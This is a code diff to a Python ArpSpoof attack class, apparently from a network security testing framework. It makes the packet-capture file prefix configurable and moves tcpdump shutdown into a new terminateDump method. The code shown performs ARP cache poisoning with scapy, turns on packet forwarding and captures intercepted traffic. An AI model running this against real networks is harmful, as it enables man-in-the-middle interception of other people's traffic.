@@ -24,7 +24,11 @@ class ArpSpoof(GenericAttack):
     def respoofer(self, targetIP, victim):
         """ Respoof the target every two seconds.
         """
-        filename = 'results/' + self.device['time'] + '_arp_cap.pcap'
+        file_prefix = "arp";
+        if ("file_prefix" in self.config.keys()):
+            file_prefix = self.config["file_prefix"]
+
+        filename = 'results/' + self.device['time'] + '_' + file_prefix + '_cap.pcap'
         self.enable_packet_forwarding()
         if self.config['tcpdump']:
             global proc
@@ -32,21 +36,17 @@ class ArpSpoof(GenericAttack):
                                   filename], stdout=subprocess.PIPE)
         try:
             while self.running:
-                print(self.running)
                 self.arpspoof(targetIP, victim)
                 time.sleep(1)
-
             self.restoreARP(targetIP, victim)
             self.disable_packet_forwarding()
-            if self.config['tcpdump']:
-                global proc
-                proc.send_signal(subprocess.signal.SIGTERM)
+            self.terminateDump()
         except Exception, j:
-            self.restoreARP(targetIP, victim)
+            self.terminateDump()
             self.disable_packet_forwarding()
-            if self.config['tcpdump']:
-                global proc
-                proc.send_signal(subprocess.signal.SIGTERM)
+            self.restoreARP(targetIP, victim)
+
+
 
     # enables packet forwarding by interacting with the proc filesystem
     def enable_packet_forwarding(self):
@@ -76,8 +76,13 @@ class ArpSpoof(GenericAttack):
         send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=4)
         send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=4)
 
+    def terminateDump(self):
+        if self.config['tcpdump']:
+            global proc
+            proc.terminate()
+            #subprocess.Popen(['sudo', 'kill', '9', proc.pid])
+
     def shutdown(self):
         self.running = False
-        time.sleep(3)
         return True
 
